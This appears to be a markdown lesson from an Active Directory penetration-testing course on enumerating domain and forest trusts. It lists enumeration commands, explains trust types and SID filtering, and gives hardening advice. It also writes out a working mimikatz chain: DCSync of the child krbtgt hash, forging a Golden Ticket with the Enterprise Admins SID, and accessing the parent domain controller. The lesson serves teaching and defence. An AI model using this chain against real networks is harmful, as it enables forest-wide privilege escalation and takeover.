# Trust Enumeration

## Unit 2 - Topic 6 | AD Enumeration

---

## Overview

**Trust enumeration** maps relationships between domains and forests, revealing potential paths for cross-domain privilege escalation. Understanding trust types, directions, and configurations is essential for attacking multi-domain environments.

---

## 1. Enumerating Trusts

```powershell
# === POWERVIEW ===
Get-DomainTrust                          # Current domain trusts
Get-DomainTrust -Domain dev.corp.local   # Specific domain trusts
Get-ForestTrust                          # Forest trusts
Get-DomainTrustMapping                   # Map all trusts

# === AD MODULE ===
Get-ADTrust -Filter *
Get-ADTrust -Filter * | select Name, Direction, TrustType

# === NET COMMANDS ===
nltest /domain_trusts
nltest /domain_trusts /all_trusts
nltest /trusted_domains

# === FROM LINUX ===
# BloodHound (best visualization):
bloodhound-python -u user -p pass -d corp.local -c trusts

# Impacket:
# Trusts visible in LDAP enumeration

# CrackMapExec:
crackmapexec smb dc01 -u user -p pass -M enum_trusts
```

---

## 2. Trust Properties to Check

```
TRUST PROPERTIES:

DIRECTION:
├── Inbound  — External domain trusts us
├── Outbound — We trust external domain  
├── Bidirectional — Mutual trust
└── CRITICAL: Direction determines access flow

TYPE:
├── ParentChild    — Automatic, two-way, transitive
├── TreeRoot       — Between tree roots in same forest
├── External       — Manual, non-transitive
├── Forest         — Manual, can be transitive
└── Shortcut       — Optimizes auth in large forests

TRANSITIVITY:
├── Transitive   — Trust extends through chain
│   A trusts B, B trusts C → A trusts C
└── Non-Transitive — Direct trust only
    A trusts B, B trusts C → A does NOT trust C

SID FILTERING:
├── Enabled (default on external/forest trusts)
│   └── Strips extra SIDs from tickets
│       → Prevents SID History attacks!
├── Disabled
│   └── Allows SID History exploitation
│       → Cross-domain privilege escalation!
└── Check: netdom trust corp.local /d:partner.local /quarantine
```

---

## 3. Trust Enumeration Checklist

| Check | Command | Why |
|-------|---------|-----|
| **All trusts** | `Get-DomainTrust` | Map attack surface |
| **Trust direction** | Check Direction property | Understand access flow |
| **SID filtering** | `netdom trust /quarantine` | If disabled → SID History attack |
| **Selective auth** | Check trust properties | Limits accessible resources |
| **Foreign members** | `Get-DomainForeignGroupMember` | Users from trusted domains |
| **Foreign groups** | `Get-DomainForeignUser` | Our users in foreign groups |

```powershell
# === FIND FOREIGN GROUP MEMBERS ===
# Users from other domains in our groups:
Get-DomainForeignGroupMember -Domain corp.local

# Our users in other domain's groups:
Get-DomainForeignUser -Domain dev.corp.local

# === FIND ACCESSIBLE RESOURCES IN TRUSTED DOMAIN ===
# If we have credentials for trusted domain:
Get-DomainComputer -Domain dev.corp.local
Get-DomainUser -Domain dev.corp.local
Find-DomainShare -Domain dev.corp.local -CheckShareAccess
```

---

## 4. Trust Attack Paths

```
TRUST ATTACK SCENARIOS:

PARENT-CHILD (SID History):
├── Compromise child domain (dev.corp.local)
├── Dump krbtgt hash of child domain
├── Create Golden Ticket with extra SID:
│   └── SID of Enterprise Admins from root domain
├── Ticket accepted across parent-child trust
└── RESULT: Root domain (corp.local) compromised!

FOREST TRUST (With SID Filtering Disabled):
├── Same technique as parent-child
├── But SID filtering SHOULD block it
├── If disabled or misconfigured → works!
└── Check: SID filtering enabled?

EXTERNAL TRUST:
├── Non-transitive, limited
├── But: Look for foreign group members
├── Users from trusted domain in local groups
├── Compromise trusted domain user → access our resources
└── More limited but still viable

BIDIRECTIONAL TRUST:
├── Attack in either direction
├── Compromise Domain A → pivot to Domain B
├── Or vice versa
└── Doubles attack surface
```

```bash
# === CROSS-DOMAIN GOLDEN TICKET ===
# From child domain with DA access:
# 1. Get child domain krbtgt hash:
mimikatz# lsadump::dcsync /user:dev\krbtgt

# 2. Get Enterprise Admins SID from parent:
Get-DomainSID -Domain corp.local
# S-1-5-21-parent-domain-sid-519 (519 = Enterprise Admins)

# 3. Forge inter-realm TGT:
mimikatz# kerberos::golden /user:Administrator \
  /domain:dev.corp.local \
  /sid:S-1-5-21-child-sid \
  /krbtgt:child_krbtgt_hash \
  /sids:S-1-5-21-parent-sid-519 \
  /ptt

# 4. Access parent domain DC:
dir \\dc01.corp.local\c$
```

---

## 5. Trust Hardening

| Defense | Description |
|---------|-------------|
| **SID filtering** | Enable on all external/forest trusts |
| **Selective authentication** | Limit which resources trusted users access |
| **Monitor trust changes** | Alert on new trusts or modifications |
| **Minimize trusts** | Remove unnecessary trust relationships |
| **Audit foreign members** | Review cross-domain group memberships |
| **Separate admin accounts** | Different admin per domain/forest |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Trust direction** | Determines who can access whose resources |
| **Transitive** | Trust extends through chain (parent-child) |
| **SID filtering** | Blocks SID History attacks across trusts |
| **Foreign members** | Users from other domains in local groups |
| **Parent-child attack** | Golden ticket + extra SID → forest compromise |
| **Defense** | Enable SID filtering, selective auth |

---

## Quick Revision Questions

1. **What does trust direction determine?**
2. **What is the difference between transitive and non-transitive trusts?**
3. **How does SID filtering protect against cross-domain attacks?**
4. **How can a child domain compromise lead to forest compromise?**
5. **What should you check regarding foreign group memberships?**

---

[← Previous: User and Group Enumeration](05-user-and-group-enumeration.md)

---

*Unit 2 - Topic 6 of 6 | [Back to README](../README.md) | [Next Unit: Initial Access Scenarios →](../03-Initial-Access-Scenarios/01-credential-harvesting.md)*
